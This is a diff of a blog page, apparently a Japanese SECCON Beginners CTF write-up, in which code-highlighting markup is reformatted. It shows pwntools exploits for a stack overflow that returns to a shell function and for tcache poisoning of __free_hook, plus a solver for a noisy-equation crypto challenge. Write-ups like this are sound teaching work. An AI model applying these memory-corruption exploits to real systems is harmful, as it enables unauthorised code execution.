@@ -22,6 +22,8 @@
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
 
     <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
+    <link rel="stylesheet" href='//blog.urandom.team/css/syntax.css'>
+    <link rel="stylesheet" href='//blog.urandom.team/css/custom.css'>
     <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
     <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
@@ -148,16 +150,31 @@ Find a way to align RSP! You're almost there!
 Congratulations!
 </code></pre><p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
 <p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
 
-io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;chall&#39;</span>)
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;chall&#39;</span><span class="p">)</span>
 
-vuln_ret <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x400862</span>)
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> vuln_ret)
-io<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
+<span class="n">vuln_ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x400862</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">vuln_ret</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
 <h3 id="beginners-heap">Beginner&rsquo;s Heap</h3>
 <p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
 <p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p>
@@ -232,8 +249,15 @@ Let's check what happens when you overwrite fd by Heap Overflow.
 </code></pre></blockquote>
 <p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
 この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> p64(free_hook_addr))
-</code></pre></div><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 But the chunk size is broken or too big maybe...?
@@ -253,9 +277,17 @@ But the chunk size is broken or too big maybe...?
 -=-=-=-=-=-=-=-=-=-=-=-=-=-=
 </code></pre></blockquote>
 <p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
-p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> p64(free_hook_addr))
-</code></pre></div><blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 But you can't get __free_hook since you can only malloc/free B.
 What if you change the chunk size to a value other than 0x20...?
@@ -266,9 +298,17 @@ What if you change the chunk size to a value other than 0x20...?
 And the chunk size is properly forged!
 </code></pre></blockquote>
 <p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
-p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>)
-</code></pre></div><p>この段階でのヒントはこんな感じ。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>この段階でのヒントはこんな感じ。</p>
 <blockquote>
 <pre><code>It seems __free_hook is successfully linked to tcache!
 The first link of tcache is __free_hook!
@@ -302,42 +342,84 @@ Also B is empty! You know what to do, right?
 </blockquote>
 <p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p>
 <p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
-p<span style="color:#f92672">.</span>sendline(pack(win_addr))
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">win_addr</span><span class="p">))</span>
 
-p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
 
-log<span style="color:#f92672">.</span>info(p<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#34;ctf4b&#34;</span>))
-</code></pre></div><h2 id="crypto">Crypto</h2>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s2">&#34;ctf4b&#34;</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="crypto">Crypto</h2>
 <h3 id="rb">R&amp;B</h3>
 <p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p>
 <h3 id="noisy-equations">Noisy equations</h3>
 <p>下記のPythonプログラムが動いている。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> getenv
-<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> time
-<span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> getrandbits, seed
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">getrandbits</span><span class="p">,</span> <span class="n">seed</span>
 
 
-FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)<span style="color:#f92672">.</span>encode()
-SEED <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;SEED&#34;</span>)<span style="color:#f92672">.</span>encode()
+<span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">SEED</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;SEED&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
 
-L <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
-N <span style="color:#f92672">=</span> len(FLAG)
+<span class="n">L</span> <span class="o">=</span> <span class="mi">256</span>
+<span class="n">N</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
 
 
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dot</span>(A, B):
-    <span style="color:#66d9ef">assert</span> len(A) <span style="color:#f92672">==</span> len(B)
-    <span style="color:#66d9ef">return</span> sum([a <span style="color:#f92672">*</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B)])
+<span class="k">def</span> <span class="nf">dot</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">)])</span>
 
-coeffs <span style="color:#f92672">=</span> [[getrandbits(L) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)]
+<span class="n">coeffs</span> <span class="o">=</span> <span class="p">[[</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
 
-seed(SEED)
+<span class="n">seed</span><span class="p">(</span><span class="n">SEED</span><span class="p">)</span>
 
-answers <span style="color:#f92672">=</span> [dot(coeff, FLAG) <span style="color:#f92672">+</span> getrandbits(L) <span style="color:#66d9ef">for</span> coeff <span style="color:#f92672">in</span> coeffs]
+<span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">dot</span><span class="p">(</span><span class="n">coeff</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">)</span> <span class="o">+</span> <span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">coeff</span> <span class="ow">in</span> <span class="n">coeffs</span><span class="p">]</span>
 
-<span style="color:#66d9ef">print</span>(coeffs)
-<span style="color:#66d9ef">print</span>(answers)
-</code></pre></div><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
+<span class="k">print</span><span class="p">(</span><span class="n">coeffs</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">answers</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
 <code>answers</code>が表示されているが、これには乱数<code>getrandbits(L)</code>が加算されているので、
 2回分のデータを使っていくという方法がある。
 いま1回目の結果得られた<code>coeffs</code>を\(C_1\)、そして2回目を\(C_2\)とすると、
@@ -419,143 +501,289 @@ x_{44}
 \right]
 $$</p>
 <p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
-<span style="color:#f92672">import</span> json
-<span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
-<span style="color:#f92672">from</span> numpy.linalg <span style="color:#f92672">import</span> inv
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
+<span class="kn">from</span> <span class="nn">numpy.linalg</span> <span class="kn">import</span> <span class="n">inv</span>
 
-stream <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span>)
+<span class="n">stream</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
 
-coeffs1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream<span style="color:#f92672">.</span>readline())
-answer1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream<span style="color:#f92672">.</span>readline())
+<span class="n">coeffs1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
+<span class="n">answer1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
 
-stream2 <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span>)
+<span class="n">stream2</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
 
-coeffs2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream2<span style="color:#f92672">.</span>readline())
-answer2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream2<span style="color:#f92672">.</span>readline())
+<span class="n">coeffs2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
+<span class="n">answer2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
 
-coeff_diffs <span style="color:#f92672">=</span>np<span style="color:#f92672">.</span>matrix(
-    [ [ c1 <span style="color:#f92672">-</span> c2 <span style="color:#66d9ef">for</span> (c1, c2) <span style="color:#f92672">in</span> zip(c1s, c2s) ] <span style="color:#66d9ef">for</span> (c1s, c2s) <span style="color:#f92672">in</span> zip(coeffs1, coeffs2)  ],
-    dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>
-)
+<span class="n">coeff_diffs</span> <span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
+    <span class="p">[</span> <span class="p">[</span> <span class="n">c1</span> <span class="o">-</span> <span class="n">c2</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="p">]</span> <span class="k">for</span> <span class="p">(</span><span class="n">c1s</span><span class="p">,</span> <span class="n">c2s</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">coeffs1</span><span class="p">,</span> <span class="n">coeffs2</span><span class="p">)</span>  <span class="p">],</span>
+    <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
+<span class="p">)</span>
 
-answer_diffs <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>transpose(
-        np<span style="color:#f92672">.</span>matrix(
-            [ a1 <span style="color:#f92672">-</span> a2 <span style="color:#66d9ef">for</span> (a1, a2) <span style="color:#f92672">in</span> zip(answer1, answer2) ],
-            dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>
-        )
-)
+<span class="n">answer_diffs</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span>
+        <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span>
+            <span class="p">[</span> <span class="n">a1</span> <span class="o">-</span> <span class="n">a2</span> <span class="k">for</span> <span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">answer1</span><span class="p">,</span> <span class="n">answer2</span><span class="p">)</span> <span class="p">],</span>
+            <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span>
+        <span class="p">)</span>
+<span class="p">)</span>
 
-coeff_diffs_inv <span style="color:#f92672">=</span> inv(
-    np<span style="color:#f92672">.</span>matrix(coeff_diffs, dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>)
-)
-flag <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>transpose(np<span style="color:#f92672">.</span>linalg<span style="color:#f92672">.</span>solve(coeff_diffs, answer_diffs))
+<span class="n">coeff_diffs_inv</span> <span class="o">=</span> <span class="n">inv</span><span class="p">(</span>
+    <span class="n">np</span><span class="o">.</span><span class="n">matrix</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">dtype</span> <span class="o">=</span> <span class="s1">&#39;float&#39;</span><span class="p">)</span>
+<span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">transpose</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">linalg</span><span class="o">.</span><span class="n">solve</span><span class="p">(</span><span class="n">coeff_diffs</span><span class="p">,</span> <span class="n">answer_diffs</span><span class="p">))</span>
 
-flag_int <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>around(flag)<span style="color:#f92672">.</span>astype(int)<span style="color:#f92672">.</span>tolist()[<span style="color:#ae81ff">0</span>]
+<span class="n">flag_int</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">around</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span><span class="o">.</span><span class="n">tolist</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
 
-<span style="color:#66d9ef">print</span>(flag)
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 
-<span style="color:#66d9ef">print</span>( <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag_int ]) )
-</code></pre></div><h3 id="rsa-calc">RSA Calc</h3>
+<span class="k">print</span><span class="p">(</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag_int</span> <span class="p">])</span> <span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="rsa-calc">RSA Calc</h3>
 <p>下記のようなプログラムが動いている。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">from</span> params <span style="color:#f92672">import</span> p, q, flag
-<span style="color:#f92672">import</span> binascii
-<span style="color:#f92672">import</span> sys
-<span style="color:#f92672">import</span> signal
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
